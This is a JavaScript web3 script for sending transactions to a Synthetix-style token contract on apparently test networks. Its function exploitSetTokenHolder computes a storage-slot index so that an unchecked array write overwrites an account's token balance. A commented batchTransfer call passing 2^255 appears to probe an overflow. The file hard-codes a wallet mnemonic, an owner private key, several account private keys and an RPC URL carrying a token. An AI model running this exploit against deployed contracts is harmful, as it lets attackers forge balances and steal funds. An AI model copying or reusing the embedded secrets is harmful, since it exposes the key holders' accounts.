// require('dotenv').config();
const HDWalletProvider = require("truffle-hdwallet-provider");
const mnemonic =
  "theory soon stone treat increase route ensure lizard soldier salt catch domain";
// const web3ProviderURL = `http://3.81.26.93:8545/`;
// 'http://3.81.26.93:8080/ropstenWeb3/jsonrpc/ZitZB2VMh2ZxnTSy9BB95JIqtEItXC'
// "http://3.81.26.93:8545/"
const web3ProviderURL = 'http://3.81.26.93:8080/ropstenWeb3/jsonrpc/ZitZB2VMh2ZxnTSy9BB95JIqtEItXC';
let hdWallet = new HDWalletProvider(mnemonic, web3ProviderURL, 0, 10);
// console.log(hdWallet);

// const { toBytes32 } = require('.');
const fs = require("fs");
const path = require("path");
const Tx = require("ethereumjs-tx").Transaction;
const BN = require("bn.js");
const Common = require("ethereumjs-common").default;
const Web3 = require("web3");

const network = "kovan";
// 'https://kovan.infura.io/v3/d5769809a53a4db0ac23801e3e1aa168'
// http://3.81.26.93:8080/ropstenWeb3/jsonrpc/ZitZB2VMh2ZxnTSy9BB95JIqtEItXC
// `http://3.81.26.93:8545/`
let web3 = new Web3(web3ProviderURL);
let synthContract = JSON.parse(
  fs.readFileSync(path.join(process.cwd(), "/build/contracts/Synthetix.json"))
);
let synthTokenStateContract = JSON.parse(
  fs.readFileSync(path.join(process.cwd(), "/build/contracts/TokenState.json"))
);
let synthetixContractAddress = "0x7B39c6a53F9e7f16AD19e9028f5092730961D1eb";
let synthetixTokenStateAddress = "0xFfbAfdcE931ff8B16B76CC726873a6ef7b26BaB1";
let resolverAddress = "0x7d1BcC09D9c2d68e55bc2508C5fC7772549890FA";
let ownerAddress = "0xe4652e66B07EE600ecf72D92c2D0CA13135d5173";
let ownerPrivateKey = Buffer.from(
  "563A1FB4F5BD9EA6271D1A7AAEECCAE5806FFAEFD35B25265B59A381A084F3D9",
  "hex"
);
let systemStatusAsHex =
  "0x53797374656d5374617475730000000000000000000000000000000000000000";
let account1Add = "0xe64e04ce8fd663c833cd33f6369ec2092d8b14c8";
let account3Add = "0xc2360503458ae653b839a5dfd40713dfeb8a0036";
let account4Add = "0xd1aeA661bA9d3da830636dA24e0FDa9620aabDe6";
let account5Add = "0x0C69fa79B7c1dF301F2cc8883030b195a97C2783";
let account6Add = "0x63a63c3b34ed80295e2da24de84b34610e21a938";
let account7Add = "0x5c76b90d9947df729b2e024411363b3af5732e5f";

let transferTokens = async (from, fromPrivKeyBuf, to, value) => {
  let synthContractInstance = new web3.eth.Contract(
    synthContract.abi,
    synthetixContractAddress
  );
  let data = synthContractInstance.methods.transfer(to, value).encodeABI();
  let txHash = await sendTransaction(
    from,
    synthetixContractAddress,
    data,
    null,
    fromPrivKeyBuf,
    null
  );
  if (!txHash) {
    console.log("transaction was not sent");
  } else {
    console.log(txHash);
  }
};

let batchTransfer = async (from, fromPrivKeyBuf, to, value) => {
  let synthContractInstance = new web3.eth.Contract(
    synthContract.abi,
    synthetixContractAddress
  );
  let data = synthContractInstance.methods.batchTransfer(to, value).encodeABI();
  console.log(data);
  let txHash = await sendTransaction(
    from,
    synthetixContractAddress,
    data,
    null,
    fromPrivKeyBuf,
    null
  );
  if (!txHash) {
    console.log("transaction was not sent");
  } else {
    console.log(txHash);
  }
};

let transferFrom = async (from, fromPrivKeyBuf, to, value) => {
  let synthContractInstance = new web3.eth.Contract(
    synthContract.abi,
    synthetixContractAddress
  );
  let data = synthContractInstance.methods
    .transferFrom(from, to, value)
    .encodeABI();
  let txHash = await sendTransaction(
    from,
    synthetixContractAddress,
    data,
    null,
    fromPrivKeyBuf,
    null
  );
  if (!txHash) {
    console.log("transaction was not sent");
  } else {
    console.log(txHash);
  }
};

let query = async () => {
  console.log(await web3.eth.getBlockNumber());
};

let sendTransaction = async (from, to, data, value, privKey, network) => {
  let nonce = await web3.eth.getTransactionCount(from);

  let gasPrice = await web3.eth.getGasPrice();
  // gasPrice = gasPrice * 1.8;
  // let gasAmount = 2000000;
  try {
    gasAmount = await web3.eth.estimateGas({ from, to, data });
  } catch (ex) {
    console.log("gas estimation failed");
    console.log(ex);
    return;
    // gasAmount = 2000000
  }
  console.log("estimation ran successfully");
  let rawTx = {
    nonce: nonce,
    gasPrice: "0x" + web3.utils.toBN(gasPrice).toString("hex"),
    to,
    value: value ? value : "0x0",
    data: data ? data : "0x",
    gasLimit: "0x" + web3.utils.toBN(gasAmount).toString("hex"),
  };

  console.log(rawTx);

  let tx;
  if (network) {
    tx = new Tx(rawTx, { chain: network });
  } else {
    let customCommon = Common.forCustomChain(
      "mainnet",
      {
        name: "my-network",
        networkId: 15,
        chainId: 15,
      },
      "petersburg"
    );
    tx = new Tx(rawTx, { common: customCommon });
  }
  tx.sign(privKey);
  let serializedTx = tx.serialize();
  let receipt;
  try {
    receipt = await web3.eth.sendSignedTransaction(
      "0x" + serializedTx.toString("hex")
    );
  } catch (ex) {
    console.log("error, transaction was not sent");
    console.log(ex);
    return;
  }
  return receipt.transactionHash;
};

// let localNonces = {};
// let getNonce = async (address) => {
//   let nonce = await web3.eth.getTransactionCount(address);
//   console.log(nonce);
//   console.log(localNonces[address]);

//   if (!localNonces[address]) {
//     localNonces[address] = nonce;
//     return nonce;
//   }
//   localNonces[address] = Math.max(nonce, localNonces[address] + 1);
//   return localNonces[address];
// };

let toBytes32 = (key) => {
  return web3.utils.rightPad(web3.utils.asciiToHex(key), 64);
};
// mappingSlot, key = hex string
let getSlotForMapping = (mappingSlot, key) => {
  let mappingSlotPadded = web3.utils.leftPad(
    mappingSlot.replace("0x", ""),
    64,
    "0"
  );
  let keyPadded = web3.utils.leftPad(key.replace("0x", ""), 64, "0");
  return web3.utils.sha3("0x" + keyPadded.concat(mappingSlotPadded), {
    encoding: "hex",
  });
};
// arraySlot, index, elementSize = BN
let getSlotForArray = (arraySlot, index, elementSize) => {
  arraySlot = arraySlot.toString("hex");
  let arraySlotPadded = web3.utils.leftPad(
    arraySlot.replace("0x", ""),
    64,
    "0"
  );
  const TWO_POW256 = new BN(
    "115792089237316195423570985008687907853269984665640564039457584007913129639936",
    10
  );
  let arraySlotHash = new BN(
    web3.utils.sha3("0x" + arraySlotPadded, { encoding: "hex" }),
    "hex"
  );
  let slotBN = arraySlotHash
    .add(index.mul(elementSize).mod(TWO_POW256))
    .mod(TWO_POW256);
  return slotBN.toString("hex");
};

let setResolverAndSyncCache = async () => {
  let synthInstance = new web3.eth.Contract(
    synthContract.abi,
    synthetixContractAddress
  );
  let data = synthInstance.methods
    .setResolverAndSyncCache(resolverAddress)
    .encodeABI();
  let txHash = await sendTransaction(
    ownerAddress,
    synthetixContractAddress,
    null,
    data,
    ownerPrivateKey,
    network
  );
  if (!txHash) {
    console.log("transaction was not sent");
  } else {
    console.log(txHash);
  }
};

let importAddresses = async () => {
  let encodedArray = [
    "DelegateApprovals",
    "Depot",
    "EtherCollateral",
    "Exchanger",
    "ExchangeRates",
    "ExchangeState",
    "FeePool",
    "FeePoolEternalStorage",
    "FeePoolState",
    "Issuer",
    "IssuanceEternalStorage",
    "RewardEscrow",
    "RewardsDistribution",
    "SupplySchedule",
    "Synthetix",
    "SynthetixEscrow",
    "SynthetixState",
    "SynthsETH",
    "SynthsUSD",
    "SystemStatus",
  ].map(toBytes32);

  let addresses = [
    delegateApprovals.address,
    depot.address,
    etherCollateral.address,
    exchanger.address,
    exchangeRates.address,
    exchangeState.address,
    feePool.address,
    feePoolEternalStorage.address,
    feePoolState.address,
    issuer.address,
    issuanceEternalStorage.address,
    rewardEscrow.address,
    rewardsDistribution.address,
    supplySchedule.address,
    synthetix.address,
    escrow.address,
    synthetixState.address,
    sETHSynth.synth.address,
    sUSDSynth.synth.address,
    systemStatus.address,
  ];
};

let checkTokenBalance = async (address) => {
  let synthContractInstance = new web3.eth.Contract(
    synthContract.abi,
    synthetixContractAddress
  );
  let res = await synthContractInstance.methods.balanceOf(address).call();
  console.log(res);
};

let setTokenHolder = async (from, fromPrivKeyBuf, index, tokenHolder) => {
  let synthTokenStateContractInstance = new web3.eth.Contract(
    synthTokenStateContract.abi,
    synthetixTokenStateAddress
  );
  let data = synthTokenStateContractInstance.methods
    .setTokenHolder(index, tokenHolder)
    .encodeABI();
  console.log(data);
  let txHash = await sendTransaction(
    from,
    synthetixTokenStateAddress,
    data,
    null,
    fromPrivKeyBuf,
    null
  );
  if (!txHash) {
    console.log("transaction was not sent");
  } else {
    console.log(txHash);
  }
};

let exploitSetTokenHolder = async () => {
  let slotToModify = new BN(getSlotForMapping("0x03", account1Add), "hex");
  let arraySlot = new BN("5", "hex");
  let keccakRes = new BN(
    web3.utils.soliditySha3(arraySlot.toString(10)),
    "hex"
  );
  let index = slotToModify.sub(keccakRes).toTwos(256);
  await setTokenHolder(
    account1Add,
    Buffer.from(
      "030f3ed42a0007f245dfaf8d15c54897be6fae9d003dbcd035833018e4af431f",
      "hex"
    ),
    index.toString(10),
    "0x1000000000000000000000000000000000000000"
  );
};

let readRawBalance = async () => {
  let index = getSlotForMapping("0x03", ownerAddress);
  let y = await web3.eth.getStorageAt(
    synthetixTokenStateAddress,
    "976252007680840753411193495136340113799484247414028472921423394745115302637424"
  );
  console.log(y);
  // let ybn = new BN(y.substring(2), 'hex');
  // let abn = new BN('99999999999999999999999294', 10);
  // console.log(ybn.eq(abn));
};

let getTokenHolders = async (index) => {
  let synthTokenStateContractInstance = new web3.eth.Contract(
    synthTokenStateContract.abi,
    synthetixTokenStateAddress
  );
  let res = await synthTokenStateContractInstance.methods
    .tokenHolders(index)
    .call();
  console.log(res);
};

let transferMultiple = async () => {
  await transferTokens(ownerAddress, ownerPrivateKey, account1Add, "201");
  await transferTokens(ownerAddress, ownerPrivateKey, account5Add, "5");
  await transferTokens(ownerAddress, ownerPrivateKey, account3Add, "500");
};

let sendEther = async (from, to, value, privKey) => {
  await sendTransaction(from, to, null, value, privKey, null);
};

let getN = async (from) => {
  let nonce = await web3.eth.getTransactionCount(from);
  console.log(nonce);
};

// transferMultiple();
// readRawBalance()
// query()
// exploitTransfer();
//'0xC2360503458Ae653b839A5dfD40713dFeB8a0036'

// checkTokenBalance(ownerAddress);
// checkTokenBalance(account1Add);
// checkTokenBalance(account4Add);
// checkTokenBalance(account5Add);
// checkTokenBalance(account3Add);
checkTokenBalance(account6Add);

// transferTokens(account1Add, Buffer.from('030f3ed42a0007f245dfaf8d15c54897be6fae9d003dbcd035833018e4af431f', 'hex'), account3Add, '10')

// transferTokens(account5Add, Buffer.from('18cae15a7d099df867d911b1df5e1c10b1d87e4c186c099e447c4d83020eb1d2', 'hex'), account6Add, '16')

// transferTokens(
//   account4Add,
//   Buffer.from(
//     "356ad3b488dc024e92a5d61e0cbd984e902d41c45bd8844df53c27d7581c32ad",
//     "hex"
//   ),
//   account7Add,
//   "10009"
// );

// transferTokens(account6Add, Buffer.from('9ace9edae906457d58fd4b784c9f1744cb40c6edd6871f5bb8416fca4564238b', 'hex'), account5Add, '10')
// transferTokens(account6Add, Buffer.from('9ace9edae906457d58fd4b784c9f1744cb40c6edd6871f5bb8416fca4564238b', 'hex'), account5Add, '10')
// transferTokens(account7Add, Buffer.from('7f1539878ea5cc4bcd38c407cd8be6c5e73cfcb2d4f20df9e67c9d6329f82d6f', 'hex'), account6Add, '100')

// transferFrom(ownerAddress, ownerPrivateKey, account1Add, '2');

// const TWO_POW255 = new BN(new BN("2", 10).pow(new BN("255", 10)), 10).toString(
//   10
// );

// console.log(TWO_POW255);
// batchTransfer(
//   account3Add,
//   Buffer.from(
//     "24087d75a4f44cb9b0cd3c8722a26bfc868560ebacca4f03bb12f0a4b5c646ee",
//     "hex"
//   ),
//   [account4Add, account5Add],
//   TWO_POW255
// );

// console.log(new BN('8000000000000000000000000000000000000000000000000000000000000000', 'hex').toString(10));

// 976252007680840753411193495136340113799484247414028472921423394745115302637424
// exploitSetTokenHolder();

// setTokenHolder(account1Add, Buffer.from('030f3ed42a0007f245dfaf8d15c54897be6fae9d003dbcd035833018e4af431f', 'hex'), 0, account1Add);

// getTokenHolders(0);
// sendEther(account6Add, account7Add, '0x500000000000', Buffer.from('9ace9edae906457d58fd4b784c9f1744cb40c6edd6871f5bb8416fca4564238b', 'hex'));
